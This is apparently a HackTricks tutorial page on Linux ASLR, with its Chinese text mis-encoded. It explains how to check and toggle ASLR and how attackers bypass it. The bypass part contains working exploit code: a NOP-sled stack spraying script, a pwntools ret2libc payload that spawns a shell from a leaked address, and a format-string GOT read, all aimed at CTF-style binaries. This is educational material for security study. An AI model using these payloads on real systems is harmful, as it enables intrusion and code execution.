# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

**åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ– (ASLR)** æ˜¯ä¸€ç§åœ¨æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„å®‰å…¨æŠ€æœ¯ï¼Œç”¨äº **éšæœºåŒ–ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜åœ°å€**ã€‚é€šè¿‡è¿™æ ·åšï¼Œå®ƒä½¿æ”»å‡»è€…é¢„æµ‹ç‰¹å®šè¿›ç¨‹å’Œæ•°æ®ï¼ˆå¦‚å †æ ˆã€å †å’Œåº“ï¼‰çš„ä½ç½®å˜å¾—æ›´åŠ å›°éš¾ï¼Œä»è€Œå‡è½»æŸäº›ç±»å‹çš„æ”»å‡»ï¼Œç‰¹åˆ«æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚

### **æ£€æŸ¥ ASLR çŠ¶æ€**

è¦ **æ£€æŸ¥** Linux ç³»ç»Ÿä¸Šçš„ ASLR çŠ¶æ€ï¼Œå¯ä»¥ä» **`/proc/sys/kernel/randomize_va_space`** æ–‡ä»¶ä¸­è¯»å–å€¼ã€‚å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­çš„å€¼å†³å®šäº†åº”ç”¨çš„ ASLR ç±»å‹ï¼š

* **0**ï¼šæ²¡æœ‰éšæœºåŒ–ã€‚ä¸€åˆ‡éƒ½æ˜¯é™æ€çš„ã€‚
* **1**ï¼šä¿å®ˆéšæœºåŒ–ã€‚å…±äº«åº“ã€å †æ ˆã€mmap()ã€VDSO é¡µé¢è¢«éšæœºåŒ–ã€‚
* **2**ï¼šå®Œå…¨éšæœºåŒ–ã€‚é™¤äº†ä¿å®ˆéšæœºåŒ–éšæœºåŒ–çš„å…ƒç´ å¤–ï¼Œé€šè¿‡ `brk()` ç®¡ç†çš„å†…å­˜ä¹Ÿè¢«éšæœºåŒ–ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ ASLR çŠ¶æ€ï¼š
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ç¦ç”¨ ASLR**

è¦**ç¦ç”¨** ASLRï¼Œæ‚¨éœ€è¦å°† `/proc/sys/kernel/randomize_va_space` çš„å€¼è®¾ç½®ä¸º **0**ã€‚åœ¨æµ‹è¯•æˆ–è°ƒè¯•åœºæ™¯ä¹‹å¤–ï¼Œé€šå¸¸ä¸å»ºè®®ç¦ç”¨ ASLRã€‚ä»¥ä¸‹æ˜¯ç¦ç”¨å®ƒçš„æ–¹æ³•ï¼š
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
æ‚¨è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç¦ç”¨ASLRæ‰§è¡Œï¼š
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **å¯ç”¨ ASLR**

è¦**å¯ç”¨** ASLRï¼Œæ‚¨å¯ä»¥å°†å€¼ **2** å†™å…¥ `/proc/sys/kernel/randomize_va_space` æ–‡ä»¶ã€‚è¿™é€šå¸¸éœ€è¦ root æƒé™ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨å®Œå…¨éšæœºåŒ–ï¼š
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **é‡å¯åçš„æŒä¹…æ€§**

ä½¿ç”¨ `echo` å‘½ä»¤æ‰€åšçš„æ›´æ”¹æ˜¯ä¸´æ—¶çš„ï¼Œå¹¶å°†åœ¨é‡å¯æ—¶é‡ç½®ã€‚è¦ä½¿æ›´æ”¹æŒä¹…åŒ–ï¼Œæ‚¨éœ€è¦ç¼–è¾‘ `/etc/sysctl.conf` æ–‡ä»¶ï¼Œå¹¶æ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
åœ¨ç¼–è¾‘ `/etc/sysctl.conf` åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åº”ç”¨æ›´æ”¹ï¼š
```bash
sudo sysctl -p
```
è¿™å°†ç¡®ä¿æ‚¨çš„ ASLR è®¾ç½®åœ¨é‡å¯åä¿æŒä¸å˜ã€‚

## **ç»•è¿‡**

### 32ä½æš´åŠ›ç ´è§£

PaX å°†è¿›ç¨‹åœ°å€ç©ºé—´åˆ†ä¸º **3 ç»„**ï¼š

* **ä»£ç å’Œæ•°æ®**ï¼ˆå·²åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–ï¼‰ï¼š`.text`ã€`.data` å’Œ `.bss` â€”> `delta_exec` å˜é‡ä¸­çš„ **16 ä½** ç†µã€‚è¯¥å˜é‡åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éšæœºåˆå§‹åŒ–ï¼Œå¹¶æ·»åŠ åˆ°åˆå§‹åœ°å€ã€‚
* ç”± `mmap()` åˆ†é…çš„ **å†…å­˜** å’Œ **å…±äº«åº“** â€”> **16 ä½**ï¼Œç§°ä¸º `delta_mmap`ã€‚
* **æ ˆ** â€”> **24 ä½**ï¼Œç§°ä¸º `delta_stack`ã€‚ç„¶è€Œï¼Œå®ƒå®é™…ä¸Šä½¿ç”¨ **11 ä½**ï¼ˆä»ç¬¬ 10 å­—èŠ‚åˆ°ç¬¬ 20 å­—èŠ‚ï¼ŒåŒ…æ‹¬ï¼‰ï¼Œå¯¹é½åˆ° **16 å­—èŠ‚** â€”> è¿™å¯¼è‡´ **524,288 ä¸ªå¯èƒ½çš„çœŸå®æ ˆåœ°å€**ã€‚

å‰é¢çš„æ•°æ®é€‚ç”¨äº 32 ä½ç³»ç»Ÿï¼Œå‡å°‘çš„æœ€ç»ˆç†µä½¿å¾—é€šè¿‡ä¸€æ¬¡åˆä¸€æ¬¡åœ°é‡è¯•æ‰§è¡Œæ¥ç»•è¿‡ ASLR æˆä¸ºå¯èƒ½ï¼Œç›´åˆ°åˆ©ç”¨æˆåŠŸå®Œæˆã€‚

#### æš´åŠ›ç ´è§£æ€è·¯ï¼š

* å¦‚æœæ‚¨æœ‰è¶³å¤Ÿå¤§çš„æº¢å‡ºä»¥å®¹çº³ **å¤§ NOP sled åœ¨ shellcode ä¹‹å‰**ï¼Œæ‚¨å¯ä»¥åœ¨æ ˆä¸­æš´åŠ›ç ´è§£åœ°å€ï¼Œç›´åˆ°æµç¨‹ **è·³è¿‡ NOP sled çš„æŸéƒ¨åˆ†**ã€‚
* å¦‚æœæº¢å‡ºä¸é‚£ä¹ˆå¤§ï¼Œå¹¶ä¸”åˆ©ç”¨å¯ä»¥åœ¨æœ¬åœ°è¿è¡Œï¼Œå¦ä¸€ç§é€‰æ‹©æ˜¯ **åœ¨ç¯å¢ƒå˜é‡ä¸­æ·»åŠ  NOP sled å’Œ shellcode**ã€‚
* å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ libc çš„åŸºåœ°å€ï¼ˆå¯¹ 32 ä½ç³»ç»Ÿæœ‰ç”¨ï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* å¦‚æœæ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥å°è¯• **æš´åŠ›ç ´è§£ `libc` å‡½æ•° `usleep` çš„åœ°å€**ï¼Œä¼ é€’å‚æ•° 10ï¼ˆä¾‹å¦‚ï¼‰ã€‚å¦‚æœåœ¨æŸä¸ªæ—¶åˆ» **æœåŠ¡å™¨å“åº”å¤šäº† 10 ç§’**ï¼Œæ‚¨å°±æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°çš„åœ°å€ã€‚

{% hint style="success" %}
åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œç†µè¦é«˜å¾—å¤šï¼Œè¿™ä¸åº”è¯¥æ˜¯å¯èƒ½çš„ã€‚
{% endhint %}

### 64 ä½æ ˆæš´åŠ›ç ´è§£

å¯ä»¥ç”¨ç¯å¢ƒå˜é‡å ç”¨æ ˆçš„å¤§éƒ¨åˆ†ï¼Œç„¶åå°è¯•åœ¨æœ¬åœ°æ•°ç™¾/æ•°åƒæ¬¡æ»¥ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ©ç”¨ã€‚\
ä»¥ä¸‹ä»£ç æ˜¾ç¤ºäº†å¦‚ä½• **ä»…é€‰æ‹©æ ˆä¸­çš„ä¸€ä¸ªåœ°å€**ï¼Œå¹¶ä¸”æ¯ **å‡ ç™¾æ¬¡æ‰§è¡Œ**ï¼Œè¯¥åœ°å€å°†åŒ…å« **NOP æŒ‡ä»¤**ï¼š
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### æœ¬åœ°ä¿¡æ¯ (`/proc/[pid]/stat`)

è¿›ç¨‹çš„æ–‡ä»¶ **`/proc/[pid]/stat`** å§‹ç»ˆå¯¹æ‰€æœ‰äººå¯è¯»ï¼Œå¹¶ä¸” **åŒ…å«æœ‰è¶£çš„** ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š

* **startcode** & **endcode**: äºŒè¿›åˆ¶æ–‡ä»¶çš„ **TEXT** ä¸Šä¸‹çš„åœ°å€
* **startstack**: **stack** å¼€å§‹çš„åœ°å€
* **start\_data** & **end\_data**: **BSS** ä¸Šä¸‹çš„åœ°å€
* **kstkesp** & **kstkeip**: å½“å‰çš„ **ESP** å’Œ **EIP** åœ°å€
* **arg\_start** & **arg\_end**: **cli arguments** ä¸Šä¸‹çš„åœ°å€
* **env\_start** &**env\_end**: **env variables** ä¸Šä¸‹çš„åœ°å€

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…ä¸è¢«åˆ©ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šï¼Œå¹¶ä¸”è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä¸æœŸæœ›æ¥è‡ªåŸå§‹å‚æ•°çš„æº¢å‡ºï¼Œè€Œæ˜¯æ¥è‡ªè¯»å–æ­¤æ–‡ä»¶åå¯ä»¥æ„é€ çš„ä¸åŒ **è¾“å…¥**ã€‚æ”»å‡»è€…å¯ä»¥ **ä»æ­¤æ–‡ä»¶ä¸­è·å–ä¸€äº›åœ°å€å¹¶ä»ä¸­æ„é€ åç§»é‡ä»¥è¿›è¡Œåˆ©ç”¨**ã€‚

{% hint style="success" %}
æœ‰å…³æ­¤æ–‡ä»¶çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html)ï¼Œæœç´¢ `/proc/pid/stat`
{% endhint %}

### æœ‰ä¸€ä¸ªæ³„æ¼

* **æŒ‘æˆ˜æ˜¯æä¾›ä¸€ä¸ªæ³„æ¼**

å¦‚æœä½ å¾—åˆ°äº†ä¸€ä¸ªæ³„æ¼ï¼ˆç®€å•çš„ CTF æŒ‘æˆ˜ï¼‰ï¼Œä½ å¯ä»¥ä»ä¸­è®¡ç®—åç§»é‡ï¼ˆå‡è®¾ä¾‹å¦‚ä½ çŸ¥é“ä½ æ­£åœ¨åˆ©ç”¨çš„ç³»ç»Ÿä¸­ä½¿ç”¨çš„ç¡®åˆ‡ libc ç‰ˆæœ¬ï¼‰ã€‚è¿™ä¸ªç¤ºä¾‹åˆ©ç”¨æå–è‡ª [**è¿™é‡Œçš„ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)ï¼ˆæŸ¥çœ‹è¯¥é¡µé¢ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼‰ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä»¥åˆ©ç”¨ **ret2plt** æ¥æå– libc ä¸­ä¸€ä¸ªå‡½æ•°çš„åœ°å€ã€‚æ£€æŸ¥ï¼š

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–**

å°±åƒåœ¨ ret2plt ä¸­ä¸€æ ·ï¼Œå¦‚æœé€šè¿‡æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æœ‰ä»»æ„è¯»å–çš„èƒ½åŠ›ï¼Œå¯ä»¥ä» GOT ä¸­æå– **libc å‡½æ•°** çš„åœ°å€ã€‚ä»¥ä¸‹ [**ç¤ºä¾‹æ¥è‡ªè¿™é‡Œ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°æœ‰å…³æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

å°è¯•é€šè¿‡åˆ©ç”¨æ ˆå†…çš„åœ°å€æ¥ç»•è¿‡ ASLRï¼š

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

**`vsyscall`** æœºåˆ¶é€šè¿‡å…è®¸æŸäº›ç³»ç»Ÿè°ƒç”¨åœ¨ç”¨æˆ·ç©ºé—´ä¸­æ‰§è¡Œæ¥æé«˜æ€§èƒ½ï¼Œå°½ç®¡å®ƒä»¬æœ¬è´¨ä¸Šæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ã€‚**vsyscalls** çš„å…³é”®ä¼˜åŠ¿åœ¨äºå®ƒä»¬çš„ **å›ºå®šåœ°å€**ï¼Œè¿™äº›åœ°å€ä¸å— **ASLR**ï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰çš„å½±å“ã€‚è¿™ç§å›ºå®šç‰¹æ€§æ„å‘³ç€æ”»å‡»è€…ä¸éœ€è¦ä¿¡æ¯æ³„æ¼æ¼æ´æ¥ç¡®å®šå®ƒä»¬çš„åœ°å€å¹¶åœ¨åˆ©ç”¨ä¸­ä½¿ç”¨å®ƒä»¬ã€‚\
ç„¶è€Œï¼Œè¿™é‡Œä¸ä¼šæ‰¾åˆ°è¶…çº§æœ‰è¶£çš„å°å·¥å…·ï¼ˆå°½ç®¡ä¾‹å¦‚å¯ä»¥è·å¾—ä¸€ä¸ª `ret;` ç­‰æ•ˆæŒ‡ä»¤ï¼‰

ï¼ˆä»¥ä¸‹ç¤ºä¾‹å’Œä»£ç æ¥è‡ª [**æ­¤å†™ä½œ**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation)ï¼‰

ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨åˆ©ç”¨ä¸­ä½¿ç”¨åœ°å€ `0xffffffffff600800`ã€‚è™½ç„¶å°è¯•ç›´æ¥è·³è½¬åˆ° `ret` æŒ‡ä»¤å¯èƒ½ä¼šå¯¼è‡´åœ¨æ‰§è¡Œå‡ ä¸ªå°å·¥å…·åä¸ç¨³å®šæˆ–å´©æºƒï¼Œä½†è·³è½¬åˆ° **vsyscall** éƒ¨åˆ†æä¾›çš„ `syscall` å¼€å§‹å¤„å¯èƒ½ä¼šæˆåŠŸã€‚é€šè¿‡ä»”ç»†æ”¾ç½®ä¸€ä¸ª **ROP** å°å·¥å…·ï¼Œå°†æ‰§è¡Œå¼•å¯¼åˆ°è¿™ä¸ª **vsyscall** åœ°å€ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸éœ€è¦ç»•è¿‡ **ASLR** çš„æƒ…å†µä¸‹å®ç°ä»£ç æ‰§è¡Œã€‚
```
efâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gefâ¤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

å› æ­¤ï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœå†…æ ¸æ˜¯ä½¿ç”¨ CONFIG\_COMPAT\_VDSO ç¼–è¯‘çš„ï¼Œ**é€šè¿‡æ»¥ç”¨ vdso ç»•è¿‡ ASLR** å¯èƒ½æ˜¯å¯è¡Œçš„ï¼Œå› ä¸º vdso åœ°å€ä¸ä¼šè¢«éšæœºåŒ–ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
